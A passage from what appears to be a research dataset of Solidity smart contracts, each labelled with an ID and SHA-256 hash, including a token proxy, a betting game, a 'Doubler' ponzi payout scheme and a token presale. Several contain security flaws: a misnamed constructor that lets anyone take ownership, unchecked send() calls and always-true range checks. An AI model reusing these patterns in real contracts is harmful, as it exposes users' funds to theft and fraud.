            switch _success case 0 { revert(returndatastart, returndatasize) }
                default { return(returndatastart, returndatasize) }
        }
    }
    function _assemblyCall(address _destination, uint _value, bytes memory _data)
    internal returns(bool success) {
        assembly {
            success := call(gas, _destination, _value, add(_data, 32), mload(_data), 0, 0)
        }
    }
}
pragma solidity 0.5.8;
contract AssetProxy is ERC20Interface, AssetProxyInterface, Bytes32, ReturnData {
    EToken2Interface public etoken2;
    bytes32 public etoken2Symbol;
    string public name;
    string public symbol;
    function init(EToken2Interface _etoken2, string memory _symbol, string memory _name)
        public returns(bool)
    {
        if (address(etoken2) != address(0)) {
            return false;
        }
        etoken2 = _etoken2;
        etoken2Symbol = _bytes32(_symbol);
        name = _name;
        symbol = _symbol;
        return true;
    }
    modifier onlyEToken2() {
        if (msg.sender == address(etoken2)) {
            _;
        }
    }
    modifier onlyAssetOwner() {
        if (etoken2.isOwner(msg.sender, etoken2Symbol)) {
            _;
        }
    }
    function _getAsset() internal view returns(AssetInterface) {
        return AssetInterface(getVersionFor(msg.sender));
    }
    function recoverTokens(ERC20Interface _asset, address _receiver, uint _value)
    public onlyAssetOwner() returns(bool) {
        return _asset.transfer(_receiver, _value);
    }
    function totalSupply() public view returns(uint) {
        return etoken2.totalSupply(etoken2Symbol);
    }
    function balanceOf(address _owner) public view returns(uint) {
        return etoken2.balanceOf(_owner, etoken2Symbol);
    }
    function allowance(address _from, address _spender) public view returns(uint) {
        return etoken2.allowance(_from, _spender, etoken2Symbol);
    }
    function decimals() public view returns(uint8) {
        return etoken2.baseUnit(etoken2Symbol);
    }
    function transfer(address _to, uint _value) public returns(bool) {
        return transferWithReference(_to, _value, '');
    }
    function transferWithReference(address _to, uint _value, string memory _reference)
    public returns(bool) {
        return _getAsset()._performTransferWithReference(
            _to, _value, _reference, msg.sender);
    }
    function transferToICAP(bytes32 _icap, uint _value) public returns(bool) {
        return transferToICAPWithReference(_icap, _value, '');
    }
    function transferToICAPWithReference(
        bytes32 _icap,
        uint _value,
        string memory _reference)
    public returns(bool) {
        return _getAsset()._performTransferToICAPWithReference(
            _icap, _value, _reference, msg.sender);
    }
    function transferFrom(address _from, address _to, uint _value) public returns(bool) {
        return transferFromWithReference(_from, _to, _value, '');
    }
    function transferFromWithReference(
        address _from,
        address _to,
        uint _value,
        string memory _reference)
    public returns(bool) {
        return _getAsset()._performTransferFromWithReference(
            _from,
            _to,
            _value,
            _reference,
            msg.sender
        );
    }
    function _forwardTransferFromWithReference(
        address _from,
        address _to,
        uint _value,
        string memory _reference,
        address _sender)
    public onlyImplementationFor(_sender) returns(bool) {
        return etoken2.proxyTransferFromWithReference(
            _from,
            _to,
            _value,
            etoken2Symbol,
            _reference,
            _sender
        );
    }
    function transferFromToICAP(address _from, bytes32 _icap, uint _value)
    public returns(bool) {
        return transferFromToICAPWithReference(_from, _icap, _value, '');
    }
    function transferFromToICAPWithReference(
        address _from,
        bytes32 _icap,
        uint _value,
        string memory _reference)
    public returns(bool) {
        return _getAsset()._performTransferFromToICAPWithReference(
            _from,
            _icap,
            _value,
            _reference,
            msg.sender
        );
    }
    function _forwardTransferFromToICAPWithReference(
        address _from,
        bytes32 _icap,
        uint _value,
        string memory _reference,
        address _sender)
    public onlyImplementationFor(_sender) returns(bool) {
        return etoken2.proxyTransferFromToICAPWithReference(
            _from,
            _icap,
            _value,
            _reference,
            _sender
        );
    }
    function approve(address _spender, uint _value) public returns(bool) {
        return _getAsset()._performApprove(_spender, _value, msg.sender);
    }
    function _forwardApprove(address _spender, uint _value, address _sender)
    public onlyImplementationFor(_sender) returns(bool) {
        return etoken2.proxyApprove(_spender, _value, etoken2Symbol, _sender);
    }
    function emitTransfer(address _from, address _to, uint _value) public onlyEToken2() {
        emit Transfer(_from, _to, _value);
    }
    function emitApprove(address _from, address _spender, uint _value) public onlyEToken2() {
        emit Approval(_from, _spender, _value);
    }
    function () external payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
    function transferToICAP(string memory _icap, uint _value) public returns(bool) {
        return transferToICAPWithReference(_icap, _value, '');
    }
    function transferToICAPWithReference(string memory _icap, uint _value, string memory _reference)
    public returns(bool) {
        return transferToICAPWithReference(_bytes32(_icap), _value, _reference);
    }
    function transferFromToICAP(address _from, string memory _icap, uint _value)
        public returns(bool)
    {
        return transferFromToICAPWithReference(_from, _icap, _value, '');
    }
    function transferFromToICAPWithReference(
        address _from,
        string memory _icap,
        uint _value,
        string memory _reference)
    public returns(bool) {
        return transferFromToICAPWithReference(_from, _bytes32(_icap), _value, _reference);
    }
    event UpgradeProposed(address newVersion);
    event UpgradePurged(address newVersion);
    event UpgradeCommited(address newVersion);
    event OptedOut(address sender, address version);
    event OptedIn(address sender, address version);
    address internal latestVersion;
    address internal pendingVersion;
    uint internal pendingVersionTimestamp;
    uint internal constant UPGRADE_FREEZE_TIME = 3 days;
    mapping(address => address) internal userOptOutVersion;
    modifier onlyImplementationFor(address _sender) {
        if (getVersionFor(_sender) == msg.sender) {
            _;
        }
    }
    function getVersionFor(address _sender) public view returns(address) {
        return userOptOutVersion[_sender] == address(0) ?
            latestVersion : userOptOutVersion[_sender];
    }
    function getLatestVersion() public view returns(address) {
        return latestVersion;
    }
    function getPendingVersion() public view returns(address) {
        return pendingVersion;
    }
    function getPendingVersionTimestamp() public view returns(uint) {
        return pendingVersionTimestamp;
    }
    function proposeUpgrade(address _newVersion) public onlyAssetOwner() returns(bool) {
        if (pendingVersion != address(0)) {
            return false;
        }
        if (_newVersion == address(0)) {
            return false;
        }
        if (latestVersion == address(0)) {
            latestVersion = _newVersion;
            return true;
        }
        pendingVersion = _newVersion;
        pendingVersionTimestamp = now;
        emit UpgradeProposed(_newVersion);
        return true;
    }
    function purgeUpgrade() public onlyAssetOwner() returns(bool) {
        if (pendingVersion == address(0)) {
            return false;
        }
        emit UpgradePurged(pendingVersion);
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
    function commitUpgrade() public returns(bool) {
        if (pendingVersion == address(0)) {
            return false;
        }
        if (pendingVersionTimestamp + UPGRADE_FREEZE_TIME > now) {
            return false;
        }
        latestVersion = pendingVersion;
        delete pendingVersion;
        delete pendingVersionTimestamp;
        emit UpgradeCommited(latestVersion);
        return true;
    }
    function optOut() public returns(bool) {
        if (userOptOutVersion[msg.sender] != address(0)) {
            return false;
        }
        userOptOutVersion[msg.sender] = latestVersion;
        emit OptedOut(msg.sender, latestVersion);
        return true;
    }
    function optIn() public returns(bool) {
        delete userOptOutVersion[msg.sender];
        emit OptedIn(msg.sender, latestVersion);
        return true;
    }
    function multiAsset() public view returns(EToken2Interface) {
        return etoken2;
    }
}
```

## RQ1_f39b6c26d8a6

SHA-256 `23d1cba6bb82e3f415fc74c2c58dd968c4c0d2f1acff6c7e053138d7e3947bdb`

```solidity
pragma solidity ^0.5.7;
contract WhoWillDieFirstInGoTs8 {
    uint8 public constant Withdraw = 0;
    uint8 public constant firstHero = 1;
    uint8 public constant lastHero = 38;
    uint8 public constant ArraySize = lastHero + 1;
    mapping(address => bool) sith;
    mapping(address => uint256[ArraySize]) public bets;
    uint256[ArraySize] public betAmount;
    uint256[ArraySize] public playerCount;
    uint256 public resultWin = 0;
    uint256 public winRatio;
    uint256 constant minBet = 0.001 ether;
    uint256 constant RR = 100000000000000;
    uint256 sithCount;
    uint256 public likeDAPP;
    bool public endBetting = false;
    bool public startPayment = false;
    bool public onPause = false;
    address payable Martin;
    address payable George;
    event Bet(address indexed _who, uint8 _hero, uint256 amount);
    modifier onlySiths {
        require(sith[msg.sender] == true);
        _;
    }
    constructor(address payable _M, address payable _G) public {
        Martin = _M;
        George = _G;
        sith[msg.sender] = true;
        sithCount++;
    }
    function like() external {
        likeDAPP++;
    }
    function dislike() external {
        if (likeDAPP > 0) {
            likeDAPP--;
        }
    }
    function setBet(uint8 _hero) external payable {
        require(onPause == false);
        require(msg.value >= minBet);
        require(endBetting == false);
        require(_hero >= firstHero || _hero <= lastHero);
        if (bets[msg.sender][_hero] == 0) {
            playerCount[_hero]++;
        }
        bets[msg.sender][_hero] += msg.value;
        betAmount[_hero] += msg.value;
        emit Bet(msg.sender, _hero, msg.value);
    }
    function getProfit(address payable _winer) external {
        require(startPayment == true);
        if (resultWin == Withdraw) {
            uint256 retValue;
            for(uint256 i = firstHero; i <= lastHero; i++) {
                uint256 bet = bets[_winer][i];
                if (bet > 0) {
                    bets[_winer][i] = 0;
                    retValue += bet;
                }
            }
            if (retValue > 0) {
                _winer.transfer(retValue); 
            }
            return;
        } else {
            uint256 winersBet = bets[_winer][resultWin];
            require(winersBet > 0);
            bets[_winer][resultWin] = 0;
            playerCount[resultWin]--;
            _winer.transfer(winersBet + winersBet * winRatio / RR);
        }
    }
    function getStatistics() external view returns (uint256[2 * ArraySize] memory) {
        uint256[2 * ArraySize] memory output;
        for(uint256 i = firstHero; i <= lastHero; i++) {
            output[i] = betAmount[i];
            output[i + ArraySize] = playerCount[i];
        }
        return output;
    }
    function getPlayerStatistics(address _player) external view returns (uint256[ArraySize] memory) {
        uint256[ArraySize] memory output;
        for(uint256 i = firstHero; i <= lastHero; i++) {
            output[i] = bets[_player][i];
        }
        return output;
    }
    function endBetPeriod() external onlySiths {
        endBetting = true;
    }
    function setResult(uint32 _result) external onlySiths {
        require(_result >=  firstHero || _result <= lastHero);
        require(startPayment == false);
        if (betAmount[_result] == 0) {
            startWithdraw();
            return;
        }
        uint256 donation = (address(this).balance - betAmount[_result]) / 10;
        Martin.transfer(donation / 2);
        George.transfer(donation / 2);
        uint256 totalBets = (address(this).balance - betAmount[_result]);
        winRatio = totalBets * RR / betAmount[_result];
        resultWin = _result;
        startPayment = true;
        if (endBetting != true) {
            endBetting = true;
        }
    }
    function startWithdraw() public onlySiths {
        require(startPayment == false);
        startPayment = true;
        if (endBetting != true) {
            endBetting = true;
        }
        if (resultWin != Withdraw) {
            resultWin = Withdraw;
        }
    }
    function pauseOn() external onlySiths {
        onPause = true;
    }
    function pauseOff() external onlySiths {
        onPause = false;
    }
    function clearBlockchain() external {
        require(startPayment && endBetting);
        if (resultWin == Withdraw) {
            require(address(this).balance < minBet);
            selfdestruct(msg.sender);
        } else {
            require(playerCount[resultWin] == 0);
            selfdestruct(msg.sender);
        }
    }
    function addSith(address _sith) external onlySiths {
        sith[_sith] = true;
        sithCount++;
    }
    function delSith(address _sith) external onlySiths {
        require(sithCount >= 2);
        sith[_sith] = false;
        sithCount--;
    }
}
```

## RQ1_58e1f2aa45d3

SHA-256 `44ce6653b45649f1b20afb669fbeec50acfe16b928bcd8702b6f8d96e6260d2c`

```solidity
pragma solidity ^0.4.24;
contract x15{
    struct Participant {
        address etherAddress;
        uint amount;
    }
    Participant[] public participants;
    uint public payoutIdx = 0;
    uint public collectedFees;
    uint public balance = 0;
    address public owner;
    modifier onlyowner { if (msg.sender == owner) _; }
    function Doubler() {
        owner = msg.sender;
    }
    function() {
        enter();
    }
    function enter() {
        if (msg.value < 1 ether) {
            msg.sender.send(msg.value);
            return;
        }
        uint idx = participants.length;
        participants.length += 1;
        participants[idx].etherAddress = msg.sender;
        participants[idx].amount = msg.value;
        if (idx != 0) {
            collectedFees += msg.value / 30;
            balance += msg.value;
        } 
        else {
            collectedFees += msg.value;
        }
        if (balance > participants[payoutIdx].amount * 2) {
            uint transactionAmount = 2 * (participants[payoutIdx].amount - participants[payoutIdx].amount / 30);
            participants[payoutIdx].etherAddress.send(transactionAmount);
            balance -= participants[payoutIdx].amount * 2;
            payoutIdx += 1;
        }
    }
    function collectFees() onlyowner {
        if (collectedFees == 0) return;
        owner.send(collectedFees);
        collectedFees = 0;
    }
    function setOwner(address _owner) onlyowner {
        owner = _owner;
    }
}
```

## RQ1_3dafc8312cd7

SHA-256 `bf35413318af07736bebabf40e916f3c3ada31e87f0d9b76e234b2a0db02ff4f`

```solidity
pragma solidity 0.4.24;
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0); 
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}
contract database {
    using SafeMath for uint256;
    struct participant {
        address eth_address; 
        uint256 topl_address; 
        uint256 arbits; 
        uint256 num_of_pro_rata_tokens_alloted;
        bool arbits_kyc_whitelist; 
        uint8 num_of_uses;
    }
    mapping(address => bool) public sale_owners;
    mapping(address => bool) public owners;
    mapping(address => bool) public masters;
    mapping(address => bool) public kycers;
    mapping(address => participant) public participants;
    address[] public participant_keys;
    bool public arbits_presale_open = false; 
    bool public iconiq_presale_open = false; 
    bool public arbits_sale_open = false; 
    uint256 public pre_kyc_bonus_denominator;
    uint256 public pre_kyc_bonus_numerator;
    uint256 public pre_kyc_iconiq_bonus_denominator;
    uint256 public pre_kyc_iconiq_bonus_numerator;
    uint256 public contrib_arbits_min;
    uint256 public contrib_arbits_max;
    uint256 public presale_arbits_per_ether;        
    uint256 public presale_iconiq_arbits_per_ether; 
    uint256 public presale_arbits_total = 18000000;
    uint256 public presale_arbits_sold;
    uint256 public sale_arbits_per_ether;
    uint256 public sale_arbits_total;
    uint256 public sale_arbits_sold;
    constructor() public {
        owners[msg.sender] = true;
    }
    function add_owner(address __subject) public only_owner {
        owners[__subject] = true;
    }
    function remove_owner(address __subject) public only_owner {
        owners[__subject] = false;
    }
    function add_master(address _subject) public only_owner {
        masters[_subject] = true;
    }
    function remove_master(address _subject) public only_owner {
        masters[_subject] = false;
    }
    function add_kycer(address _subject) public only_owner {
        kycers[_subject] = true;
    }
    function remove_kycer(address _subject) public only_owner {
        kycers[_subject] = false;
    }
    modifier log_participant_update(address __eth_address) {
        participant_keys.push(__eth_address); 
        _;
    }
    modifier only_owner() {
        require(owners[msg.sender]);
        _;
    }
    modifier only_kycer() {
        require(kycers[msg.sender]);
        _;
    }
    modifier only_master_or_owner() {
        require(masters[msg.sender] || owners[msg.sender]);
        _;
    }
    function get_sale_owner(address _a) public view returns(bool) {
        return sale_owners[_a];
    }
    function get_contrib_arbits_min() public view returns(uint256) {
        return contrib_arbits_min;
    }
    function get_contrib_arbits_max() public view returns(uint256) {
        return contrib_arbits_max;
    }
    function get_pre_kyc_bonus_numerator() public view returns(uint256) {
        return pre_kyc_bonus_numerator;
    }
    function get_pre_kyc_bonus_denominator() public view returns(uint256) {
        return pre_kyc_bonus_denominator;
    }
    function get_pre_kyc_iconiq_bonus_numerator() public view returns(uint256) {
        return pre_kyc_iconiq_bonus_numerator;
    }
    function get_pre_kyc_iconiq_bonus_denominator() public view returns(uint256) {
        return pre_kyc_iconiq_bonus_denominator;
    }
    function get_presale_iconiq_arbits_per_ether() public view returns(uint256) {
        return (presale_iconiq_arbits_per_ether);
    }
    function get_presale_arbits_per_ether() public view returns(uint256) {
        return (presale_arbits_per_ether);
    }
    function get_presale_arbits_total() public view returns(uint256) {
        return (presale_arbits_total);
    }
    function get_presale_arbits_sold() public view returns(uint256) {
        return (presale_arbits_sold);
    }
    function get_sale_arbits_per_ether() public view returns(uint256) {
        return (sale_arbits_per_ether);
    }
    function get_sale_arbits_total() public view returns(uint256) {
        return (sale_arbits_total);
    }
    function get_sale_arbits_sold() public view returns(uint256) {
        return (sale_arbits_sold);
    }
    function set_sale_owner(address _a, bool _v) public only_master_or_owner {
        sale_owners[_a] = _v;
    }
    function set_contrib_arbits_min(uint256 _v) public only_master_or_owner {
        contrib_arbits_min = _v;
    }
    function set_contrib_arbits_max(uint256 _v) public only_master_or_owner {
        contrib_arbits_max = _v;
    }
    function set_pre_kyc_bonus_numerator(uint256 _v) public only_master_or_owner {
        pre_kyc_bonus_numerator = _v;
    }
    function set_pre_kyc_bonus_denominator(uint256 _v) public only_master_or_owner {
        pre_kyc_bonus_denominator = _v;
    }
    function set_pre_kyc_iconiq_bonus_numerator(uint256 _v) public only_master_or_owner {
        pre_kyc_iconiq_bonus_numerator = _v;
    }
    function set_pre_kyc_iconiq_bonus_denominator(uint256 _v) public only_master_or_owner {
        pre_kyc_iconiq_bonus_denominator = _v;
    }
    function set_presale_iconiq_arbits_per_ether(uint256 _v) public only_master_or_owner {
        presale_iconiq_arbits_per_ether = _v;
    }
    function set_presale_arbits_per_ether(uint256 _v) public only_master_or_owner {
        presale_arbits_per_ether = _v;
    }
    function set_presale_arbits_total(uint256 _v) public only_master_or_owner {
        presale_arbits_total = _v;
    }
    function set_presale_arbits_sold(uint256 _v) public only_master_or_owner {
        presale_arbits_sold = _v;
    }
    function set_sale_arbits_per_ether(uint256 _v) public only_master_or_owner {
        sale_arbits_per_ether = _v;
    }
    function set_sale_arbits_total(uint256 _v) public only_master_or_owner {
        sale_arbits_total = _v;
    }
    function set_sale_arbits_sold(uint256 _v) public only_master_or_owner {
        sale_arbits_sold = _v;
    }
    function get_participant(address _a) public view returns(
        address,
        uint256,
        uint256,
        uint256,
        bool,
        uint8
    ) {
        participant storage subject = participants[_a];
        return (
            subject.eth_address,
            subject.topl_address,
            subject.arbits,
            subject.num_of_pro_rata_tokens_alloted,
            subject.arbits_kyc_whitelist,
            subject.num_of_uses
        );
    }
    function get_participant_num_of_uses(address _a) public view returns(uint8) {
        return (participants[_a].num_of_uses);
    }
    function get_participant_topl_address(address _a) public view returns(uint256) {
        return (participants[_a].topl_address);
    }
    function get_participant_arbits(address _a) public view returns(uint256) {
        return (participants[_a].arbits);
    }
    function get_participant_num_of_pro_rata_tokens_alloted(address _a) public view returns(uint256) {
        return (participants[_a].num_of_pro_rata_tokens_alloted);
    }
    function get_participant_arbits_kyc_whitelist(address _a) public view returns(bool) {
        return (participants[_a].arbits_kyc_whitelist);
    }
    function set_participant(
        address _a,
        uint256 _ta,
        uint256 _arbits,
        uint256 _prta,
        bool _v3,
        uint8 _nou
    ) public only_master_or_owner log_participant_update(_a) {
        participant storage subject = participants[_a];
        subject.eth_address = _a;
        subject.topl_address = _ta;
        subject.arbits = _arbits;
        subject.num_of_pro_rata_tokens_alloted = _prta;
        subject.arbits_kyc_whitelist = _v3;
        subject.num_of_uses = _nou;
    }
    function set_participant_num_of_uses(
        address _a,
        uint8 _v
    ) public only_master_or_owner log_participant_update(_a) {
        participants[_a].num_of_uses = _v;
    }
    function set_participant_topl_address(
        address _a,
        uint256 _ta
    ) public only_master_or_owner log_participant_update(_a) {
        participants[_a].topl_address = _ta;
    }
    function set_participant_arbits(
        address _a,
        uint256 _v
    ) public only_master_or_owner log_participant_update(_a) {
        participants[_a].arbits = _v;
    }
    function set_participant_num_of_pro_rata_tokens_alloted(
        address _a,
        uint256 _v
    ) public only_master_or_owner log_participant_update(_a) {
        participants[_a].num_of_pro_rata_tokens_alloted = _v;
    }
    function set_participant_arbits_kyc_whitelist(
        address _a,
        bool _v
    ) public only_kycer log_participant_update(_a) {
        participants[_a].arbits_kyc_whitelist = _v;
    }
    function get_iconiq_presale_open() public view only_master_or_owner returns(bool) {
        return iconiq_presale_open;
    }
    function get_arbits_presale_open() public view only_master_or_owner returns(bool) {
        return arbits_presale_open;
    }
    function get_arbits_sale_open() public view only_master_or_owner returns(bool) {
        return arbits_sale_open;
    }
    function set_iconiq_presale_open(bool _v) public only_master_or_owner {
        iconiq_presale_open = _v;
    }
    function set_arbits_presale_open(bool _v) public only_master_or_owner {
        arbits_presale_open = _v;
    }
    function set_arbits_sale_open(bool _v) public only_master_or_owner {
        arbits_sale_open = _v;
    }
}
library topl_database_lib {
    function get_participant(address db, address _a) internal view returns(
        address,
        uint256,
        uint256,
        uint256,
        bool,
        uint8
    ) {
        return database(db).get_participant(_a);
    }
    function get_topl_address(address db, address _a) internal view returns(uint256) {
        return database(db).get_participant_topl_address(_a);
    }
    function get_arbits(address db, address _a) internal view returns(uint256) {
        return database(db).get_participant_arbits(_a);
    }
    function get_iconiq_tokens(address db, address _a) internal view returns(uint256) {
        return database(db).get_participant_num_of_pro_rata_tokens_alloted(_a);
    }
    function get_arbits_whitelist(address db, address _a) internal view returns(bool) {
        return database(db).get_participant_arbits_kyc_whitelist(_a);
    }
    function get_num_of_uses(address db, address _a) internal view returns(uint8) {
        return database(db).get_participant_num_of_uses(_a);
    }
    function set_participant(
        address db,
        address _a,
        uint256 _ta,
        uint256 _arbits,
        uint256 _prta,
        bool _v3,
        uint8 _nou
    ) internal {
        database(db).set_participant(_a, _ta, _arbits, _prta, _v3, _nou);
        emit e_set_participant(_a, _ta, _arbits, _prta, _v3, _nou);
    }
    function set_topl_address(address db, address _a, uint256 _ta) internal {
        database(db).set_participant_topl_address(_a, _ta);
        emit e_set_topl_address(_a, _ta);
    }
    function set_arbits(address db, address _a, uint256 _v) internal {
        database(db).set_participant_arbits(_a, _v);
        emit e_set_arbits(_a, _v);
    }
    function set_iconiq_tokens(address db, address _a, uint256 _v) internal {
        database(db).set_participant_num_of_pro_rata_tokens_alloted(_a, _v);
        emit e_set_iconiq_tokens(_a, _v);
    }
    function set_arbits_whitelist(address db, address _a, bool _v) internal {
        database(db).set_participant_arbits_kyc_whitelist(_a, _v);
        emit e_set_arbits_whitelist(_a, _v);
    }
    function set_num_of_uses(address db, address _a, uint8 _v) internal {
        database(db).set_participant_num_of_uses(_a, _v);
        emit e_set_num_of_uses(_a, _v);
    }
    function add_arbits(address db, address _a, uint256 _v) internal {
        uint256 c = database(db).get_participant_arbits(_a) + _v;     
        assert(c >= database(db).get_participant_arbits(_a)); 
        database(db).set_participant_arbits(
            _a,
            (database(db).get_participant_arbits(_a) + _v)
        );
        emit e_add_arbits(_a, _v);
    }
    function sub_arbits(address db, address _a, uint256 _v) internal {
        assert(_v <= database(db).get_participant_arbits(_a)); 
        database(db).set_participant_arbits(
            _a,
            (database(db).get_participant_arbits(_a) - _v)
        );
        emit e_sub_arbits(_a, _v);
    }
    function get_pre_kyc_iconiq_bonus_numerator(address db) internal view returns(uint256) {
        return database(db).get_pre_kyc_iconiq_bonus_numerator();
    }
    function get_pre_kyc_iconiq_bonus_denominator(address db) internal view returns(uint256) {
        return database(db).get_pre_kyc_iconiq_bonus_denominator();
    }
    function get_iconiq_presale_open(address db) internal view returns(bool) {
        return database(db).get_iconiq_presale_open();
    }
    function get_presale_iconiq_arbits_per_ether(address db) internal view returns(uint256) {
        return database(db).get_presale_iconiq_arbits_per_ether();
    }
    function set_pre_kyc_iconiq_bonus_numerator(address db, uint256 _v) internal {
        database(db).set_pre_kyc_iconiq_bonus_numerator(_v);
        emit e_set_pre_kyc_iconiq_bonus_numerator(_v);
    }
    function set_pre_kyc_iconiq_bonus_denominator(address db, uint256 _v) internal {
        database(db).set_pre_kyc_iconiq_bonus_denominator(_v);
        emit e_set_pre_kyc_iconiq_bonus_denominator(_v);
    }
    function set_iconiq_presale_open(address db, bool _v) internal {
        database(db).set_iconiq_presale_open(_v);
        emit e_set_iconiq_presale_open(_v);
    }
    function set_presale_iconiq_arbits_per_ether(address db, uint256 _v) internal {
        database(db).set_presale_iconiq_arbits_per_ether(_v);
        emit e_set_presale_iconiq_arbits_per_ether(_v);
    }
    function get_pre_kyc_bonus_numerator(address db) internal view returns(uint256) {
        return database(db).get_pre_kyc_bonus_numerator();
    }
    function get_pre_kyc_bonus_denominator(address db) internal view returns(uint256) {
        return database(db).get_pre_kyc_bonus_denominator();
    }
    function get_arbits_presale_open(address db) internal view returns(bool) {
        return database(db).get_arbits_presale_open();
    }
    function get_presale_arbits_per_ether(address db) internal view returns(uint256) {
        return database(db).get_presale_arbits_per_ether();
    }
    function set_pre_kyc_bonus_numerator(address db, uint256 _v) internal {
        database(db).set_pre_kyc_bonus_numerator(_v);
        emit e_set_pre_kyc_bonus_numerator(_v);
    }
    function set_pre_kyc_bonus_denominator(address db, uint256 _v) internal {
        database(db).set_pre_kyc_bonus_denominator(_v);
        emit e_set_pre_kyc_bonus_denominator(_v);
    }
    function set_arbits_presale_open(address db, bool _v) internal {
        database(db).set_arbits_presale_open(_v);
        emit e_set_arbits_presale_open(_v);
    }
    function set_presale_arbits_per_ether(address db, uint256 _v) internal {
        database(db).set_presale_arbits_per_ether(_v);
        emit e_set_presale_arbits_per_ether(_v);
    }
    function get_presale_arbits_total(address db) internal view returns(uint256) {
        return database(db).get_presale_arbits_total();
    }
    function get_presale_arbits_sold(address db) internal view returns(uint256) {
        return database(db).get_presale_arbits_sold();
    }
    function get_arbits_max_contribution(address db) internal view returns(uint256) {
        return database(db).get_contrib_arbits_max();
    }
    function get_arbits_min_contribution(address db) internal view returns(uint256) {
        return database(db).get_contrib_arbits_min();
    }
    function set_presale_arbits_total(address db, uint256 _v) internal {
        database(db).set_presale_arbits_total(_v);
        emit e_set_presale_arbits_total(_v);
    }
    function set_presale_arbits_sold(address db, uint256 _v) internal {
        database(db).set_presale_arbits_sold(_v);
        emit e_set_presale_arbits_sold(_v);
    }
    function set_arbits_max_contribution(address db, uint256 _v) internal {
        database(db).set_contrib_arbits_max(_v);
        emit e_set_arbits_max_contribution(_v);
    }
    function set_arbits_min_contribution(address db, uint256 _v) internal {
        database(db).set_contrib_arbits_min(_v);
        emit e_set_arbits_min_contribution(_v);
    }
    function add_presale_arbits_sold(address db, uint256 _v) internal {
        uint256 c = database(db).get_presale_arbits_sold() + _v;     
        assert(c >= database(db).get_presale_arbits_sold()); 
        database(db).set_presale_arbits_sold(
            (database(db).get_presale_arbits_sold() + _v)
        );
        emit e_add_presale_arbits_sold(_v);
    }
    function sub_presale_arbits_sold(address db, uint256 _v) internal {
        assert(_v <= database(db).get_presale_arbits_sold()); 
        database(db).set_presale_arbits_sold(
            (database(db).get_presale_arbits_sold() - _v)
        );
        emit e_sub_presale_arbits_sold(_v);
    }
    function set_sale_owner(address db, address _a, bool _v) internal {
        database(db).set_sale_owner(_a, _v);
    }
    function get_sale_owner(address db, address _a) internal view returns(bool) {
        return database(db).get_sale_owner(_a);
    }
    event e_set_sale_owner(address, bool);
    event e_set_num_of_uses(address, uint8);
    event e_set_arbits_whitelist(address, bool);
    event e_set_participant(address, uint256, uint256, uint256, bool, uint8);
    event e_set_topl_address(address, uint256);
    event e_set_arbits(address, uint256);
    event e_set_iconiq_tokens(address, uint256);
    event e_add_arbits(address, uint256);
    event e_sub_arbits(address, uint256);
    event e_set_pre_kyc_bonus_numerator(uint256);
    event e_set_pre_kyc_bonus_denominator(uint256);
    event e_set_iconiq_presale_open(bool);
    event e_set_arbits_presale_open(bool);
    event e_set_presale_iconiq_arbits_per_ether(uint256);
    event e_set_presale_arbits_per_ether(uint256);
    event e_set_presale_arbits_total(uint256);
    event e_set_presale_arbits_sold(uint256);
    event e_add_presale_arbits_sold(uint256);
    event e_sub_presale_arbits_sold(uint256);
    event e_set_arbits_max_contribution(uint256);
    event e_set_arbits_min_contribution(uint256);
    event e_set_pre_kyc_iconiq_bonus_numerator(uint256);
    event e_set_pre_kyc_iconiq_bonus_denominator(uint256);
}
contract arbits_presale {
    using topl_database_lib for address;
    using SafeMath for uint256;
    address public owner;
    address public db;
    struct participant {
        address eth_address; 
        uint256 topl_address; 
        uint256 arbits; 
        uint256 num_of_pro_rata_tokens_alloted;
        bool arbits_kyc_whitelist; 
        uint8 num_of_uses;
    }
    constructor(address __db) public {
        db = __db;
        owner = msg.sender;
    }
    function owner_linkage() public { 
        db.set_sale_owner(owner, true);
    }
    modifier only_owner() {
        require(db.get_sale_owner(msg.sender));
        _;
    }
    function add_owner(address __subject) public only_owner {
        db.set_sale_owner(__subject, true);
        emit e_add_owner(msg.sender, __subject);
    }
    function remove_owner(address __subject) public only_owner {
        db.set_sale_owner(__subject, false);
        emit e_remove_owner(msg.sender, __subject);
    }
    modifier presale_open() {
        require(db.get_arbits_presale_open());
        _;
    }
    modifier use_count() {
        uint8 uses = db.get_num_of_uses(msg.sender);
        require(uses < 5);
        db.set_num_of_uses(msg.sender, uses + 1);
        _;
    }
    function participate_in_arbits_presale_crypto() public payable presale_open use_count {
        (                                                                  
            address p1,                                                    
            uint256 p2,                                                    
            uint256 p3,                                                    
            uint256 p4,                                                    
            bool p5,                                                       
            uint8 p6                                                       
        ) = db.get_participant(msg.sender);                                
        participant memory subject = participant(p1, p2, p3, p4, p5, p6);  
        uint256 subject_tokens_to_add = msg.value.mul(db.get_presale_arbits_per_ether()).div(1 ether);                                    
        if (subject.arbits_kyc_whitelist) {                                                                                               
            subject_tokens_to_add = subject_tokens_to_add.mul(db.get_pre_kyc_bonus_numerator()).div(db.get_pre_kyc_bonus_denominator());  
        }                                                                                                                                 
        require(db.get_presale_arbits_total() >= db.get_presale_arbits_sold().add(subject_tokens_to_add));  
        require(db.get_arbits_max_contribution() >= subject_tokens_to_add); 
        require(db.get_arbits_min_contribution() <= subject_tokens_to_add); 
        db.add_presale_arbits_sold(subject_tokens_to_add); 
        db.add_arbits(msg.sender, subject_tokens_to_add); 
        emit e_participate_in_arbits_presale_crypto(msg.sender, msg.value);  
    }
    function participate_in_arbits_presale_fiat(address _a, uint256 _t) public only_owner {
        db.add_presale_arbits_sold(_t); 
        db.add_arbits(_a, _t); 
        emit e_participate_in_arbits_presale_fiat(_a, _t);  
    }
    function() public payable {
        participate_in_arbits_presale_crypto(); 
        emit e_fallback(msg.sender, msg.value);
    }
    function kill_and_withdraw(address withdraw_to) public only_owner {
        emit e_kill_and_withdraw(withdraw_to);
        selfdestruct(withdraw_to);
    }
    function withdraw_some_amount(address withdraw_to, uint256 amount) public only_owner {
